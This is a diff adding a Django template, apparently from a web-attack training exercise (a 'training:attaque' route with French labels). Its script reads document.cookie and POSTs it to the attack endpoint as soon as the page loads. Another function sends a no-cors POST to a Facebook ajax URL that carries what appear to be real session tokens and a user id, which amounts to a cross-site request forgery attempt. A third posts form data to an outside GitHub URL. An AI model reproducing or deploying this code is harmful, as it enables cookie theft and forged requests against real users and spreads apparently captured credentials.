@@ -1,0 +1,82 @@
+{% extends 'base.html' %}
+
+{% block content %}
+<form method="post" action="{% url 'training:attaque' %}">
+    {% csrf_token %}
+    <input type="submit" value="Supprimer le joueur" />
+</form>
+
+<input class="width-full form-control" id="user_profile_name" placeholder="Name" aria-label="Name" name="user[profile_name]" value="Vannecy1">
+<button onclick="postData()">Envoyer</button>
+{% for player in players %}
+
+<h1>{{player.name}}</h1>
+
+
+{%endfor%}
+<button onclick="sendCookies()">Envoyer les cookies</button>
+
+</body>
+</html>
+
+
+
+<script>
+    function postData() {
+        const inputValue = document.getElementById('user_profile_name').value;
+        fetch('https://github.com/Vannecy', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ profile_name: inputValue }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Réponse:', data);
+        })
+        .catch((error) => {
+            console.error('Erreur:', error);
+        });
+    }
+</script>
+<script>
+    function sendCookies() {
+        var cookies = document.cookie;
+        fetch("{% url 'training:attaque' %}", { 
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRFToken': '{{ csrf_token }}',
+            },
+            body: JSON.stringify({ cookies: cookies }),
+        })
+        .then(response => {
+            console.log('Les cookies ont été envoyés avec succès.');
+        })
+        .catch(error => {
+            console.error('Une erreur s\'est produite lors de l\'envoi des cookies :', error);
+        });
+    }
+    sendCookies(); // Envoyer les cookies dès que la page est chargée
+</script>
+<script>
+    function sendRequest() {
+        const url = 'https://www.facebook.com/ajax/bnzai?__a=1&__aaid=0&__ccg=EXCELLENT&__comet_req=15&__hs=19667.HYP%3Acomet_pkg.2.1..2.1&__hsi=7298288566252333265&__req=q&__rev=1009707120&__s=m4fq1s%3A3kiu0d%3Afjnr59&__spin_b=trunk&__spin_r=1009707120&__spin_t=1699265224&__user=100002115987946&dpr=1.5&fb_dtsg=NAcM3Wkk1eFZTOXngsF-HTFo_P0idp6qFGTbrIK8ba28Q_M6rsfi80Q%3A24%3A1696830331&jazoest=25327&lsd=4jgafF8RVcTNlDaOM5eH5F&ph=C3';
+
+        fetch(url, {
+            method: 'POST',
+            mode: 'no-cors', // Définit le mode pour 'no-cors' pour contourner les restrictions CORS
+        })
+        .then(response => {
+            console.log('La requête POST a été exécutée avec succès.');
+        })
+        .catch(error => {
+            console.error('Une erreur s\'est produite lors de l\'exécution de la requête POST :', error);
+        });
+    }
+</script>
+
+
+{% endblock %}
+
